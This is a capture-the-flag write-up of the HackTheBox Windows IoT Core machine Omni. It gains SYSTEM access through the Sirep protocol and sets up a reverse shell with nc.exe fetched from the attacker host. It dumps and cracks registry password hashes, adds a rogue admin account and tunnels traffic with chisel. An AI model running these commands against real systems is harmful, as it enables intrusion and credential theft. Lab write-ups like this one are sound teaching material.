---
title: HTB: Omni
url: https://0xdf.gitlab.io/2021/01/09/htb-omni.html
date: 2021-01-09T14:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: ctf, htb-omni, hackthebox, windows-iot-core, sirep, sireprat, powershell-credential, secretsdump, penglab, hashcat, chisel, credentials, windows-device-portal, oscp-like-v2
---

![Omni](https://0xdfimages.gitlab.io/img/omni-cover.png)

Omni looks like a normal Windows host at first, but it’s actually Windows IOT Core, the flavor of Windows that will run on a Raspberry Pi. I’ll abuse Sirep protocol to get code execution as SYSTEM. From there, I’ll get access as both the app user and as administrator to decrypt the flags in each of their home directories. I’ll show multiple ways to get the user’s credentials.

## Box Info

| Name | [Omni](https://hackthebox.com/machines/omni)  [Omni](https://hackthebox.com/machines/omni) [Play on HackTheBox](https://hackthebox.com/machines/omni) |
| --- | --- |
| Release Date | [22 Aug 2020](https://twitter.com/hackthebox_eu/status/1304338734616317952) |
| Retire Date | 09 Jan 2021 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Omni |
| Radar Graph | Radar chart for Omni |
| First Blood User | 01:21:02[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| First Blood Root | 02:01:30[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [egre55 egre55](https://app.hackthebox.com/users/1190) |

## Recon

### nmap

`nmap` found six open TCP ports, RPC (135), WinRM (5985), HTTP (8080), and three unknowns (29817, 29819, 29820):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.204
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 14:29 EDT
Nmap scan report for 10.10.10.204
Host is up (0.015s latency).
Not shown: 65529 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
5985/tcp  open  wsman
8080/tcp  open  http-proxy
29817/tcp open  unknown
29819/tcp open  unknown
29820/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 13.44 seconds

root@kali# nmap -p 135,5985,8080,29817,29819,29820 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.204
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-23 14:30 EDT
Nmap scan report for 10.10.10.204
Host is up (0.014s latency).

PORT      STATE SERVICE  VERSION
135/tcp   open  msrpc    Microsoft Windows RPC
5985/tcp  open  upnp     Microsoft IIS httpd
8080/tcp  open  upnp     Microsoft IIS httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
29817/tcp open  unknown
29819/tcp open  arcserve ARCserve Discovery
29820/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port29820-TCP:V=7.80%I=7%D=8/23%Time=5F42B5BD%P=x86_64-pc-linux-gnu%r(N
SF:ULL,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(GenericLines,10,"
SF:\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(Help,10,"\*LY\xa5\xfb`\x0
SF:4G\xa9m\x1c\xc9}\xc8O\x12")%r(JavaRMI,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\x
SF:c9}\xc8O\x12");
Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.98 seconds

```

The ports and versions do seem to indicate it’s Windows, but it doesn’t look like normal Windows. Some Googling based on the above results on this suggests this box is running [Windows IOT Core](https://developer.microsoft.com/en-us/windows/iot/) (like [here](https://www.blackhat.com/docs/us-16/materials/us-16-Sabanal-Into-The-Core-In-Depth-Exploration-Of-Windows-10-IoT-Core-wp.pdf) and [here](https://social.msdn.microsoft.com/Forums/vstudio/en-US/75314423-de13-4eff-bd15-0fec8b9c1da4/ports-open?forum=WindowsIoT)).

### Website - TCP 8080

Visiting pops a prompt for “Windows Device Portal”:

![image-20200823181108888](https://0xdfimages.gitlab.io/img/image-20200823181108888.png)

Basic guessing doesn’t work, and without creds there’s nothing to see here.

### RPC - TCP 135

RPC client fails with null session:

```

root@kali# rpcclient -U "" -N 10.10.10.204
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT

```

### Sirep - TCP 29819/29820

[This presentation](https://www.woprsummit.org/slides-archive/SirepRAT_RCEasSYSTEMonWindowsIoTCore-WOPRSummit.pdf) presented in early 2019 goes into how the Sirep protocol works, and most importantly, how it provides remote unauthenticated execution as SYSTEM on Windows IOT hosts. Typically this service isn’t on by default, but it is on Omni.

## Shell as SYSTEM

### RCE

The shell from the presentation, [SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT) works…kinda. For example, a directory listing of the root of C:

```

root@kali:/opt/SirepRAT# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c dir c:\ '
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 584, payload peek: ' Volume in drive C is MainOS Volume Serial Numbe'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>

```

The start of the output is shown, but nothing useful. The `/b` flag will just print the files, but it seems to lose all whitespace:

```

root@kali:/opt/SirepRAT# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c dir c:\ /b'
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 71, payload peek: '$Reconfig$DataProgram FilesPROGRAMSSystemD'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>

```

Some of the typical folders (like `c:\programdata`) are not present.

### Shell

After a lot of trial and error, I found that an old favorite staging area was present on this box:

```

root@kali:/opt/SirepRAT# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c dir c:\windows\system32\spool\drivers\color /b'
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 163, payload peek: 'D50.campD65.campGraphics.gmmpMediaSim.gmmp'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>

```

The contents of the directory aren’t important, just that it exists. Trying to upload `nc.exe` using `PowerShell -c wget` and `PowerShell` with `System.Net.Webclient` both errored out. Still, `Invoke-WebRequest` worked:

```

root@kali:/opt/SirepRAT# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c powershell Invoke-W
ebRequest -outfile c:\windows\system32\spool\drivers\color\nc.exe -uri http://10.10.14.24/nc64.exe' 

```

Running `nc64.exe` returns a shell:

```

root@kali:/opt/SirepRAT# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c c:\windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.14.24 443'

```

At a `nc` listener:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443                                                    
Ncat: Connection from 10.10.10.204.
Ncat: Connection from 10.10.10.204:49670. 
Microsoft Windows [Version 10.0.17763.107]
Copyright (c) Microsoft Corporation. All rights reserved.

C:\windows\system32>

```

The box doesn’t have `whoami` on it, but the shell is running as SYSTEM.

## Priv: SYSTEM –> app

### Enumeration

As SYSTEM, I have access to both `user.txt` and `root.txt`. However, they are not the standard flags. Instead, both are PSCredential files:

```

C:\>type \data\users\app\user.txt
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">flag</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7</SS>
    </Props>
  </Obj>
</Objs>

```

To decrypt the “password” field, the user’s password is needed.

### Path #1: Dump Hashes From Registry

#### Backup Registry Hives

The intended path is to dump the hashes from the registry files. I’ll first create an SMB share to write to using `smbserver.py`. Windows now requires that SMB shares are mounted with authentication, so I’ll run it with a username and password configured:

```

root@kali# smbserver.py share . -smb2support -username df -password df
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Now I’ll mount the share from Omni (I’ll just use the RCE “RAT”):

```

root@kali:/opt/SirepRAT# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c net use \\10.10.14.24\share /u:df df'
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 39, payload peek: 'The command completed successfully.'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>

```

Now I’ll run `reg save` to backup the three hives I need:

```

root@kali:/opt/SirepRAT# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c reg save HKLM\sam \
\10.10.14.24\share\sam'
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 40, payload peek: 'The operation completed successfully.'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
root@kali:/opt/SirepRAT# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c reg save HKLM\system \\10.10.14.24\share\system'
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
root@kali:/opt/SirepRAT# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c reg save HKLM\security \\10.10.14.24\share\security'
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 40, payload peek: 'The operation completed successfully.'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>

```

I’m not sure why `system` reported a failure, but it did work:

```

root@kali# ls -l
total 14848
-rwxrwx--- 1 root vboxsf    36864 Aug 23  2020 sam
-rwxrwx--- 1 root vboxsf    32768 Aug 23  2020 security
-rwxrwx--- 1 root vboxsf 15106048 Aug 23  2020 system

```

#### Extract Hashes

`secretsdump.py` will dump the hashes:

```

root@kali# secretsdump.py -sam sam -security security -system system LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4a96b0f404fd37b862c07c2aa37853a5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:330fe4fd406f9d0180d67adb0b0dfa65:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:91ad590862916cdfd922475caed3acea:::
DevToolsUser:1002:aad3b435b51404eeaad3b435b51404ee:1b9ce6c5783785717e9bbb75ba5f9958:::
app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdc2beb4869328393b57ea9a28aeff84932c3e3ef
dpapi_userkey:0x6760a0b981e854b66007b33962764d5043f3d013
[*] NL$KM 
 0000   14 07 22 73 99 42 B0 ED  F5 11 9A 60 FD A1 10 EF   .."s.B.....`....
 0010   DF 19 3C 6C 22 F2 92 0C  34 B1 6D 78 CC A7 0D 14   ..<l"...4.mx....
 0020   02 7B 81 04 1E F6 1C 66  69 75 69 84 A7 31 53 26   .{.....fiui..1S&
 0030   A3 6B A9 C9 BF 18 A8 EF  10 36 DB C2 CC 27 73 3D   .k.......6...'s=
NL$KM:140722739942b0edf5119a60fda110efdf193c6c22f2920c34b16d78cca70d14027b81041ef61c6669756984a7315326a36ba9c9bf18a8ef1036dbc2cc27733d
[*] Cleaning up... 

```

#### Crack Hashes

I’ll drop these into my modified [Penglab](https://github.com/mxrch/penglab) notebook:

[![image-20200823222735727](https://0xdfimages.gitlab.io/img/image-20200823222735727.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200823222735727.png)

It manages to crack the password for the app account with the password “mesh5143”.

### Path #2: Remote secretsdump.py

#### Local Admin

Because I’m SYSTEM, I should be able to add an administrator account. I’ll create an account:

```

C:\>net user fakeadmin passw0rd! /add
The command completed successfully.

```

Now I’ll add it to the administrators group:

```

C:\>net localgroup administrators /add fakeadmin
The command completed successfully.

```

However, if I check the group, I don’t see my new user in it:

```

C:\>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
The command completed successfully.

```

If I check immediately after adding, the user is in the administrators group:

```

C:\>net localgroup administrators /add fakeadmin & net localgroup administrators
The command completed successfully.

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
fakeadmin
The command completed successfully.

```

But only a second later, it’s gone:

```

C:\>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
The command completed successfully.

```

I’ll need to work fast to use that privilege.

#### Tunnel

I’ll upload [Chisel](https://github.com/jpillora/chisel) to Omni (saved as `c.exe`) and create a tunnel from my host to TCP 445 on Omni:

```

C:\Windows\system32\spool\drivers\color>.\c client 10.10.14.24:8000 R:445:localhost:445
.\c client 10.10.14.24:8000 R:445:localhost:445
2020/08/24 02:09:35 client: Connecting to ws://10.10.14.24:8000
2020/08/24 02:09:36 client: Fingerprint 60:d4:64:b0:62:25:dd:f0:ac:18:c1:cf:aa:5c:57:03
2020/08/24 02:09:36 client: Connected (Latency 1.0903ms)

```

Now I can use `secretsdump.py` to dump hashes from Omni.

#### Dump Hashes

I’ll need to work quickly. I’ll use `ping` as a one second sleep so that I can change terminal windows and then start running `secretsdump.py`:

```

C:\>ping -n 2 10.10.14.24 & net localgroup administrators /add fakeadmin

Pinging 10.10.14.24 with 32 bytes of data:
Reply from 10.10.14.24: bytes=32 time=11ms TTL=63
Reply from 10.10.14.24: bytes=32 time=11ms TTL=63

Ping statistics for 10.10.14.24:
    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 11ms, Maximum = 11ms, Average = 11ms
The command completed successfully.

```

In another pane, I’ll dump the hashes:

```

root@kali# secretsdump.py 'fakeadmin:passw0rd!@127.0.0.1'
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x4a96b0f404fd37b862c07c2aa37853a5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:330fe4fd406f9d0180d67adb0b0dfa65:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:91ad590862916cdfd922475caed3acea:::
DevToolsUser:1002:aad3b435b51404eeaad3b435b51404ee:1b9ce6c5783785717e9bbb75ba5f9958:::
app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::
df:1004:aad3b435b51404eeaad3b435b51404ee:27ffc3b27968b191018b8778c7226ae3:::
fakeadmin:1006:aad3b435b51404eeaad3b435b51404ee:27ffc3b27968b191018b8778c7226ae3:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdc2beb4869328393b57ea9a28aeff84932c3e3ef
dpapi_userkey:0x6760a0b981e854b66007b33962764d5043f3d013
[*] NL$KM 
 0000   14 07 22 73 99 42 B0 ED  F5 11 9A 60 FD A1 10 EF   .."s.B.....`....
 0010   DF 19 3C 6C 22 F2 92 0C  34 B1 6D 78 CC A7 0D 14   ..<l"...4.mx....
 0020   02 7B 81 04 1E F6 1C 66  69 75 69 84 A7 31 53 26   .{.....fiui..1S&
 0030   A3 6B A9 C9 BF 18 A8 EF  10 36 DB C2 CC 27 73 3D   .k.......6...'s=
NL$KM:140722739942b0edf5119a60fda110efdf193c6c22f2920c34b16d78cca70d14027b81041ef61c6669756984a7315326a36ba9c9bf18a8ef1036dbc2cc27733d
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

```

It took a couple tries to get it, but it worked!

Now I can crack them just as [above](#path-1-dump-hashes-from-registry).

### Path #3: Find Automation

There’s something running constantly that’s removing users from the administrators group (as noted in the previous section). In the Windows Device Portal (more on that later) I can check the process list and see a `PING.EXE` constantly showing up and then going away.

![image-20200823224520133](https://0xdfimages.gitlab.io/img/image-20200823224520133.png)

The PID changes every couple seconds.

There’s a hidden bat file in `C:\program files\windowspowershell\modules\packagemanagement`:

```

PS C:\program files\windowspowershell\modules\packagemanagement> gci -force

    Directory: C:\program files\windowspowershell\modules\packagemanagement

Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----       10/26/2018  11:37 PM                1.0.0.1                       
-a-h--        8/21/2020  12:56 PM            247 r.bat  

```

The file is simple:

```

@echo off

:LOOP

for /F "skip=6" %%i in ('net localgroup "administrators"') do net localgroup "administrators" %%i /delete

net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz

ping -n 3 127.0.0.1

cls

GOTO :LOOP

:EXIT

```

It runs forever. Each time, it loops over users in the administrators group, and deletes them (skipping the real admin). Then it resets the passwords for both app and administrator. Finally, it does a `ping -n 3`, which is effectively a three second sleep.

When I was first solving this box, I found this file before I thought to dump hashes.

### Shell

The creds for app work on HTTP port 8080 to get access to the Windows Device Portal. In the Processes menu, there’s a Run command option:

![image-20200823223044284](https://0xdfimages.gitlab.io/img/image-20200823223044284.png)

I could work out of here, but I’ll pivot to a `nc.exe` shell for convenience:

![image-20200823223139648](https://0xdfimages.gitlab.io/img/image-20200823223139648.png)

There’s no output on the website, but a shell returns:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.204.
Ncat: Connection from 10.10.10.204:49799.
Microsoft Windows [Version 10.0.17763.107]
Copyright (c) Microsoft Corporation. All rights reserved.

C:\windows\system32>

```

### Decrypt user.txt

As app, I can use `Import-CliXml` to decrypt the “password”, which in this case is the flag. I’ll switch to PowerShell:

```

C:\Data\Users\app>powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Data\Users\app>

```

Now I can get the password:

```

PS C:\Data\Users\app> (Import-CliXml -Path user.txt).GetNetworkCredential().Password
7cfd50f6bc34db3204898f1505ad9d70

```

## Priv: app –> administrator

### Enumeration

In app’s home directory, there are two more files of interest:

```

PS C:\Data\Users\app> dir

    Directory: C:\Data\Users\app

Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-r---         7/4/2020   7:28 PM                3D Objects                    
d-r---         7/4/2020   7:28 PM                Documents                     
d-r---         7/4/2020   7:28 PM                Downloads                     
d-----         7/4/2020   7:28 PM                Favorites                     
d-r---         7/4/2020   7:28 PM                Music                         
d-r---         7/4/2020   7:28 PM                Pictures                      
d-r---         7/4/2020   7:28 PM                Videos                        
-ar---         7/4/2020   8:20 PM            344 hardening.txt                 
-ar---         7/4/2020   8:14 PM           1858 iot-admin.xml                 
-ar---         7/4/2020   9:53 PM           1958 user.txt 

```

`hardening.txt` contains a check list of steps that fit with what I’ve already observed:

```
- changed default administrator password of "p@ssw0rd"
- added firewall rules to restrict unnecessary services
- removed administrator account from "Ssh Users" group

```

`iot-admin.xml` is another PSCredential file. app can decode this one too:

```

PS C:\Data\Users\app> $cred = Import-CliXml -Path iot-admin.xml
PS C:\Data\Users\app> $cred.GetNetworkCredential() | fl

UserName : administrator
Password : _1nt3rn37ofTh1nGz
Domain   : omni

```

### Shell

I’ll close my browser and revisit TCP 8080, this time logging in as administrator. I’ll trigger `nc.exe` again:

![image-20200823224139097](https://0xdfimages.gitlab.io/img/image-20200823224139097.png)

And get a shell:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.204.
Ncat: Connection from 10.10.10.204:49802.
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32>

```

### Decrypt root.txt

Same as above, I’ll read the file using `Import-CliXml`, and then pull out the password which is the flag:

```

PS C:\data\users\administrator> (Import-CliXml -Path root.txt).GetNetworkCredential() | fl

UserName : flag
Password : 5dbdce5569e2c4708617c0ce6e9bf11d
Domain   : 

```